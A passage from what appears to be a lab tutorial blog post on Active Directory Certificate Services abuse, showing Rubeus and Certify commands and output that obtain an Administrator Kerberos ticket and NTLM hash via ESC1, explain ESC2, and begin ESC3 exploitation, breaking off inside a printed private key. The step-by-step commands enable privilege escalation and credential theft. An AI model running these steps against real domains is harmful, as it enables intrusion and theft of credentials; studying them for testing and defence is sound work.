      <span class="n">doIGjDCCBoigAwIBBaEDAgEWooIFkDCCBYxhggWIMIIFhKADAgEFoRIbEEVMU1dJWENPUlAuTE9DQUyi</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>   <span class="n">WqgSGxBFTFNXSVhDT1JQLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBlbHN3aXhjb3JwLmxvY2Fs</span>

  <span class="n">ServiceName</span>              <span class="p">:</span>  <span class="n">krbtgt</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
  <span class="n">ServiceRealm</span>             <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
  <span class="n">UserName</span>                 <span class="p">:</span>  <span class="n">administrator</span> <span class="p">(</span><span class="n">NT_PRINCIPAL</span><span class="p">)</span>
  <span class="n">UserRealm</span>                <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
  <span class="n">StartTime</span>                <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">10</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">26</span> <span class="n">AM</span>
  <span class="n">EndTime</span>                  <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">8</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">26</span> <span class="n">PM</span>
  <span class="n">RenewTill</span>                <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">30</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">10</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">26</span> <span class="n">AM</span>
  <span class="n">Flags</span>                    <span class="p">:</span>  <span class="n">name_canonicalize</span><span class="p">,</span> <span class="n">pre_authent</span><span class="p">,</span> <span class="n">initial</span><span class="p">,</span> <span class="n">renewable</span><span class="p">,</span> <span class="n">forwardable</span>
  <span class="n">KeyType</span>                  <span class="p">:</span>  <span class="n">rc4_hmac</span>
  <span class="n">Base64</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="mi">3</span><span class="n">kpw4gV2eu7PzXjMtMY</span><span class="o">+</span><span class="n">qg</span><span class="o">==</span>
  <span class="n">ASREP</span> <span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="mi">53947</span><span class="n">F0B0F355E87DBC5F6EA1C4F42EB</span>

<span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span>
</pre></div>
<p>As seen in the output, we successfully obtained a <strong>TGT for the Administrator account</strong>. </p><br/>
<p>You can also attempt to retrieve the NT hash of the <code>administrator</code> or the user specified in the <code>altname</code> parameter by providing the <code>/getcredentials</code> parameter to Rubeus:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">administrator</span> <span class="o">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span>\<span class="n">cert</span><span class="o">.</span><span class="n">pfx</span> <span class="o">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">getcredentials</span>

   <span class="n">______</span>        <span class="n">_</span>
  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>
   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>

  <span class="n">v2</span><span class="mf">.3.3</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Ask</span> <span class="n">TGT</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">domain</span><span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">PKINIT</span> <span class="k">with</span> <span class="n">etype</span> <span class="n">rc4_hmac</span> <span class="ow">and</span> <span class="n">subject</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswix</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Building</span> <span class="n">AS</span><span class="o">-</span><span class="n">REQ</span> <span class="p">(</span><span class="n">w</span><span class="o">/</span> <span class="n">PKINIT</span> <span class="n">preauth</span><span class="p">)</span> <span class="k">for</span><span class="p">:</span> <span class="s1">'elswixcorp.local</span><span class="se">\a</span><span class="s1">dministrator'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">8486</span><span class="p">:</span><span class="mi">53</span><span class="n">c9</span><span class="p">:</span><span class="mi">7</span><span class="n">ec5</span><span class="p">:</span><span class="mi">93</span><span class="n">ed</span><span class="o">%</span><span class="mi">5</span><span class="p">:</span><span class="mi">88</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">TGT</span> <span class="n">request</span> <span class="n">successful</span><span class="err">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">base64</span><span class="p">(</span><span class="n">ticket</span><span class="o">.</span><span class="n">kirbi</span><span class="p">):</span>

      <span class="n">doIGjDCCBoigAwIBBaEDAgEWooIFkDCCBYxhggWIMIIFhKADAgEFoRIbEEVMU1dJWENPUlAuTE9DQUyi</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">qgSGxBFTFNXSVhDT1JQLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBlbHN3aXhjb3JwLmxvY2Fs</span>

  <span class="n">ServiceName</span>              <span class="p">:</span>  <span class="n">krbtgt</span><span class="o">/</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
  <span class="n">ServiceRealm</span>             <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
  <span class="n">UserName</span>                 <span class="p">:</span>  <span class="n">administrator</span> <span class="p">(</span><span class="n">NT_PRINCIPAL</span><span class="p">)</span>
  <span class="n">UserRealm</span>                <span class="p">:</span>  <span class="n">ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span>
  <span class="n">StartTime</span>                <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">10</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">04</span> <span class="n">AM</span>
  <span class="n">EndTime</span>                  <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">8</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">04</span> <span class="n">PM</span>
  <span class="n">RenewTill</span>                <span class="p">:</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">30</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">10</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">04</span> <span class="n">AM</span>
  <span class="n">Flags</span>                    <span class="p">:</span>  <span class="n">name_canonicalize</span><span class="p">,</span> <span class="n">pre_authent</span><span class="p">,</span> <span class="n">initial</span><span class="p">,</span> <span class="n">renewable</span><span class="p">,</span> <span class="n">forwardable</span>
  <span class="n">KeyType</span>                  <span class="p">:</span>  <span class="n">rc4_hmac</span>
  <span class="n">Base64</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="n">kUVbX0cb</span><span class="o">+</span><span class="mi">0</span><span class="n">WOJCFe</span><span class="o">/</span><span class="n">mDW2A</span><span class="o">==</span>
  <span class="n">ASREP</span> <span class="p">(</span><span class="n">key</span><span class="p">)</span>              <span class="p">:</span>  <span class="mi">76</span><span class="n">C300879B19D3E71BD2C41937A85F1E</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">credentials</span> <span class="n">using</span> <span class="n">U2U</span>

  <span class="n">CredentialInfo</span>         <span class="p">:</span>
    <span class="n">Version</span>              <span class="p">:</span> <span class="mi">0</span>
    <span class="n">EncryptionType</span>       <span class="p">:</span> <span class="n">rc4_hmac</span>
    <span class="n">CredentialData</span>       <span class="p">:</span>
      <span class="n">CredentialCount</span>    <span class="p">:</span> <span class="mi">1</span>
       <span class="n">NTLM</span>              <span class="p">:</span> <span class="mi">58</span><span class="n">A478135A93AC3BF058A5EA0E8FDB71</span>
</pre></div>
<p>This can be done via a U2U request, which we will cover in upcoming articles.</p><br/>
<h3>Breaking Down the ESC1 Exploitation Process</h3><br/>
<p>Let’s summarize and break down the key steps that led to privilege escalation.</p><br/>
<p>First, we identified a <strong>certificate template</strong> that allows <strong>domain authentication</strong> because it includes the <strong>Client Authentication EKU</strong>. More importantly, it has the <strong>ENROLLEE_SUPPLIES_SUBJECT</strong> flag enabled, which means we can specify an <strong>arbitrary Subject Alternative Name (SAN)</strong> in the <strong>Certificate Signing Request (CSR)</strong>. Additionally, the template grants <strong>Domain Users</strong> the ability to enroll, meaning <strong>any authenticated user in the domain</strong> can request a certificate using this template. These conditions create a <strong>high-risk privilege escalation vector</strong> that can be exploited.</p><br/>
<h3><strong>Certificate Request and Issuance</strong></h3><br/>
<p>When we submitted the <strong>CSR</strong>, the <strong>Certificate Authority (CA)</strong> processed the request by:</p><br/>
<ol>
<li>
<p>Checking which <strong>template</strong> was specified in the CSR.</p><br/>
</li>
<li>
<p>Detecting that a <strong>SAN</strong> was included in the request.</p><br/>
</li>
<li>
<p>Verifying whether the selected template allows the requester to <strong>supply a SAN</strong>.</p><br/>
</li>
<li>
<p>Since this configuration was enabled, the CA simply <strong>copies the attacker-supplied SAN into the final certificate</strong> without performing additional validation.</p><br/>
</li>
</ol>
<p>This means the issued certificate is now <strong>valid for authentication</strong> and is mapped to the <strong>SAN value we provided</strong>, rather than the user who originally requested the certificate.</p><br/>
<h3><strong>Authentication via Kerberos PKINIT</strong></h3><br/>
<p>When we submitted the <strong>AS_REQ</strong> request to the <strong>KDC</strong> with the certificate, the KDC first checks <strong>which user we are trying to authenticate as</strong>. Since the <strong>SAN field in the certificate contains "Administrator"</strong>, the KDC assumes the request is legitimate and <strong>issues a TGT for the Administrator account</strong>.</p><br/>
<p>One important detail to note is the <strong><code>/user</code></strong> parameter we specified. This value <strong>must match</strong> the <strong><code>/altname</code></strong> provided when requesting the certificate; otherwise, the <strong>asktgt</strong> request will fail. This happens because the KDC expects the certificate to be associated with the user specified in <code>/user</code>. If there is a mismatch, the authentication attempt is rejected since the certificate does not belong to the requested identity.</p><br/>
<h3>Note</h3><br/>
<p>I specified the <strong>second Domain Controller (DC02)</strong> in the <strong><code>/dc</code></strong> parameter because if the request were sent to the <strong>updated DC (DC01)</strong>, the certificate would be <strong>rejected</strong>, as <strong>recent security updates prevent this type of exploitation</strong>.</p><br/>
<h3>Misconfigured Certificate Templates (ESC2)</h3><br/>
<p>This technique is <strong>very similar</strong> to <code>ESC1</code>, as it relies on a <strong>misconfigured certificate template</strong> that allows an attacker to request a certificate that can be abused for <strong>privilege escalation</strong>. The <strong>requirements</strong> for <code>ESC2</code> are nearly identical to those of <code>ESC1</code>, with one key difference:</p><br/>
<p>Instead of relying on <strong>Client Authentication</strong> or <strong>Smart Card Logon</strong> EKUs, <code>ESC2</code> abuses <strong>certificate templates that either contain the "Any Purpose" EKU (<code>2.5.29.37.0</code>) or have no EKU set at all</strong>.</p><br/>
<h3>Understanding EKUs in ESC2</h3><br/>
<br/><h3>Any Purpose EKU (<code>2.5.29.37.0</code>)</h3><br/>
<p>The <strong>Any Purpose EKU</strong> is an <strong>extremely permissive setting</strong> that allows a certificate to be used for <strong>any cryptographic function</strong> without restriction. In practice, this means that applications, including <strong>Kerberos PKINIT</strong>, may <strong>implicitly accept these certificates for authentication</strong>, even if the template was not explicitly designed for that purpose.</p><br/>
<br/><h3>No EKU Set (Implicit SubCA Behavior)</h3><br/>
<p>If a certificate is issued <strong>without any EKUs</strong>, it is effectively treated as having <strong>no restrictions on its usage</strong>, making it function similarly to a <strong>subordinate CA certificate</strong>. This means that an attacker who obtains such a certificate can use it <strong>for any purpose</strong>, including <strong>signing new certificates</strong>. With the ability to issue certificates, the attacker can generate new ones with <strong>arbitrary Extended Key Usages (EKUs)</strong> or <strong>custom identity fields</strong>, allowing them to craft certificates that suit their needs.</p><br/>
<p>However, for a <strong>subordinate CA certificate</strong> to issue authentication certificates that can be used in <strong>Kerberos PKINIT</strong>, it must be explicitly trusted by the <strong>NTAuthCertificates</strong> object in Active Directory. By default, this trust is <strong>not granted</strong>, meaning that certificates issued by a rogue subordinate CA <strong>will not be accepted for domain authentication</strong>. Despite this limitation, an attacker can still abuse this type of certificate by generating new ones with <strong>EKUs such as Code Signing, Server Authentication, or Secure Email</strong>, which could have serious implications for <strong>other security mechanisms in the network</strong>, including <strong>SAML authentication, AD FS, and IPSec</strong>.</p><br/>
<p>I will not demonstrate how to abuse <code>ESC2</code> because it is too similar to <code>ESC1</code>. The only difference is the EKU; the other requirements are the same, so the exploitation process is identical to <code>ESC1</code>.</p><br/>
<h3>Enrollment Agent Templates (ESC3)</h3><br/>
<p>ESC3 abuses misconfigured certificate templates that allow enrollment agents to request certificates on behalf of other users. This is possible due to the <strong>Certificate Request Agent EKU</strong> (OID <code>1.3.6.1.4.1.311.20.2.1</code>), commonly referred to as <strong>Enrollment Agent</strong> in Microsoft’s documentation.</p><br/>
<p>When a user has a certificate with this EKU, they can <strong>co-sign certificate requests</strong> for other users. This means an attacker who can enroll in such a template can generate certificates <strong>for any user</strong>, provided that:</p><br/>
<ol>
<li>
<p>The target certificate template is <strong>Schema Version 1</strong> (which does not enforce additional restrictions), or</p><br/>
</li>
<li>
<p>The target certificate template is <strong>Schema Version 2+</strong> and explicitly requires an <strong>"Authorized Signatures/Application Policy" Issuance Requirement</strong> (which the attacker can fulfill).</p><br/>
</li>
</ol>
<p>By leveraging this misconfiguration, an attacker can issue certificates for privileged accounts (e.g., an Administrator), ultimately escalating privileges within the domain.</p><br/>
<p>In essence, if an attacker obtains a certificate that includes the <strong>Certificate Request Agent EKU</strong>, they gain the ability to request certificates on behalf of other users. By leveraging a "dangerous" template—such as the default <strong>User</strong> template, which allows for client authentication—the attacker can <strong>co-sign</strong> the certificate request, impersonating any arbitrary user. This effectively enables privilege escalation, as the attacker can generate a valid authentication certificate for high-privileged accounts, such as domain administrators.</p><br/>
<h3>Exploitation</h3><br/>
<p>Initially, let's search for vulnerable templates using <code>Certify.exe</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">find</span> <span class="o">/</span><span class="n">vulnerable</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Vulnerable</span> <span class="n">Certificates</span> <span class="n">Templates</span> <span class="p">:</span>

    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">ESC3</span>
    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="mi">2</span>
    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="mi">2</span> <span class="n">years</span>
    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="mi">6</span> <span class="n">weeks</span>
    <span class="n">msPKI</span><span class="o">-</span><span class="n">Certificate</span><span class="o">-</span><span class="n">Name</span><span class="o">-</span><span class="n">Flag</span>          <span class="p">:</span> <span class="n">SUBJECT_ALT_REQUIRE_UPN</span><span class="p">,</span> <span class="n">SUBJECT_REQUIRE_DIRECTORY_PATH</span>
    <span class="n">mspki</span><span class="o">-</span><span class="n">enrollment</span><span class="o">-</span><span class="n">flag</span>                 <span class="p">:</span> <span class="n">AUTO_ENROLLMENT</span>
    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="mi">0</span>
    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Certificate</span> <span class="n">Request</span> <span class="n">Agent</span>
    <span class="n">mspki</span><span class="o">-</span><span class="n">certificate</span><span class="o">-</span><span class="n">application</span><span class="o">-</span><span class="n">policy</span>  <span class="p">:</span> <span class="n">Certificate</span> <span class="n">Request</span> <span class="n">Agent</span>
    <span class="n">Permissions</span>
      <span class="n">Enrollment</span> <span class="n">Permissions</span>
        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Users</span>       <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">513</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>
      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
        <span class="n">Owner</span>                       <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">Administrator</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">500</span>
        <span class="n">WriteOwner</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">Administrator</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">500</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>
        <span class="n">WriteDacl</span> <span class="n">Principals</span>        <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">Administrator</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">500</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>
        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">Administrator</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">500</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>


<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">12.1101152</span>
</pre></div>
<p>As seen in the output, it found a template named <code>ESC3</code> which has the <code>Certificate Request Agent</code> EKU, thus making it vulnerable to <strong>ESC3</strong>. </p><br/>
<p>Now, let's request a certificate using this template:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">request</span> <span class="o">/</span><span class="n">ca</span><span class="p">:</span><span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span> <span class="o">/</span><span class="n">template</span><span class="p">:</span><span class="n">ESC3</span> 

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Request</span> <span class="n">a</span> <span class="n">Certificates</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Current</span> <span class="n">user</span> <span class="n">context</span>    <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">elswix</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">No</span> <span class="n">subject</span> <span class="n">name</span> <span class="n">specified</span><span class="p">,</span> <span class="n">using</span> <span class="n">current</span> <span class="n">context</span> <span class="k">as</span> <span class="n">subject</span><span class="o">.</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Template</span>                <span class="p">:</span> <span class="n">ESC3</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswix</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">Authority</span>   <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CA</span> <span class="n">Response</span>             <span class="p">:</span> <span class="n">The</span> <span class="n">certificate</span> <span class="n">had</span> <span class="n">been</span> <span class="n">issued</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span>              <span class="p">:</span> <span class="mi">19</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>         <span class="p">:</span>

<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIEogIBAAKCAQEA2rfCj65u39XNu1WuPirmSOaE9aXTXPgJTdSaH16kA3xkSL63</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">..</span><span class="mf">.2</span><span class="n">uUf61UVoimG</span><span class="o">+</span><span class="n">PuIy3XFiVXm</span><span class="o">+</span><span class="n">zF9APxojB</span>
<span class="n">nEMPNFCKo8IMluUOKMA9KeXVgwFgvRjHy7zLqu7eSmHxPd0iQas</span><span class="o">=</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
